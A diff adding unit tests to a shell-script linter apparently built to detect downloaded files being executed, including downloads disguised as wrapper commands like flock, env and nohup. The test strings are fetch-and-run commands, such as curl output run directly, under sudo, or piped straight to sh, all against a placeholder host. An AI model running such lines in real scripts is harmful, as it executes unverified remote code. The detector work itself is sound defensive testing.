@@ -475,6 +475,73 @@ class TestWhatCountsAsExecuting(unittest.TestCase):
                                                "./scripts/local.sh\n"))
 
 
+class TestADownloadNamedLikeAWrapper(unittest.TestCase):
+    """#2227: the reader knows a wrapper by its basename and reads through it,
+    so a download called `flock`, run as `./flock 9`, came out as the `flock`
+    wrapper running nothing, and only what the reader left was compared with
+    the download. Each word read as a wrapper is compared with the downloads
+    too, as the command word is, and is still read through."""
+
+    URL = "https://example.test/tool"
+
+    def test_a_download_run_as_a_wrapper_is_running_it(self):
+        url = self.URL
+        for script in (
+                # FLAGGED on main, where `flock` and `setsid` were not wrappers yet.
+                f"touch flock && chmod +x flock && curl -fsSL -o flock {url} && ./flock 9\n",
+                f"curl -fsSL -o /tmp/flock {url}\n/tmp/flock 9\n",
+                f"curl -fsSL -o bin/flock {url}\nbin/flock -n /tmp/lock make build\n",
+                f"curl -fsSL -o setsid {url}\nsudo ./setsid true\n",
+                # An older wrapper name, CLEAN on main, and one reached through a copy.
+                f"curl -fsSL -o env {url}\n./env FOO=1 make build\n",
+                f"curl -fsSL -o /tmp/payload {url}\ncp /tmp/payload ./nohup\n./nohup make\n",
+                # A bare name, compared as a bare `tool` is: with `.` on PATH it runs the download.
+                f"curl -fsSL -o flock {url}\nPATH=.:$PATH flock 9\n"):
+            with self.subTest(script=script):
+                self.assertIn("running it", wg.fetch_exec_defect(script) or "")
+
+    def test_a_wrapper_word_naming_another_file_is_not_the_download(self):
+        # The same name is not the same file: `/usr/bin/env` is not ./env, and
+        # ./flock is not /tmp/flock.
+        for script in (f"curl -fsSL -o env {self.URL}\n/usr/bin/env FOO=1 make\n",
+                       f"curl -fsSL -o /tmp/flock {self.URL}\n./flock 9\n"):
+            with self.subTest(script=script):
+                self.assertIsNone(wg.fetch_exec_defect(script))
+
+    def test_a_dynamic_path_to_a_download_behind_a_wrapper_is_reported(self):
+        # Main refused `$PWD/flock` behind `sudo`, as it refuses `sudo "$X"`:
+        # reading it as the `flock` wrapper by its last word read it clean.
+        # The older names get the same refusal now (`$PWD/env` runs the
+        # download as root here), which is the cost the rule accepts.
+        for script in (f'curl -fsSL -o flock {self.URL}\nsudo "$PWD/flock" 9\n',
+                       f'curl -fsSL -o env {self.URL}\nsudo "$PWD/env" FOO=1 make\n'):
+            with self.subTest(script=script):
+                self.assertIn("dynamic command operand behind a wrapper",
+                              wg.fetch_exec_defect(script) or "")
+
+    def test_a_dynamic_word_behind_a_wrapper_is_unresolved_whatever_its_name(self):
+        argv = shell_reader.statements('sudo "$PWD/chrt" 10 make')[0].stages[0].argv
+        self.assertIn("dynamic command operand behind a wrapper",
+                      shell_reader.unresolved_wrapper(argv) or "")
+        self.assertIn("cannot read command behind wrapper",
+                      wg.fetch_exec_defect('sudo "$PWD/chrt" 10 make\n') or "")
+
+    def test_a_download_under_any_other_name_is_running_it_as_before(self):
+        script = f"touch tool && chmod +x tool && curl -fsSL -o tool {self.URL} && ./tool 9\n"
+        self.assertIn("running it", wg.fetch_exec_defect(script) or "")
+
+    def test_a_copied_system_wrapper_is_still_read_through(self):
+        # Nothing fetched ./env, so reading through it is what finds the fetch
+        # it runs: taking `./env` for a plain file would read this step clean.
+        script = f"cp /usr/bin/env ./env\n./env sh -c 'curl -fsSL {self.URL} | sh'\n"
+        self.assertIn("straight to `sh`", wg.fetch_exec_defect(script) or "")
+
+    def test_a_wrapper_with_nothing_fetched_reads_as_before(self):
+        self.assertEqual([], shell_reader.command(["flock", "9"]))
+        self.assertIsNone(shell_reader.unresolved_wrapper(["flock", "9"]))
+        self.assertIsNone(wg.fetch_exec_defect("flock 9\n./flock 9\n"))
+
+
 class TestTheFormsThatHideAFetch(unittest.TestCase):
     """Spellings that are not `curl <url> -o <file>` and mean the same thing.
 
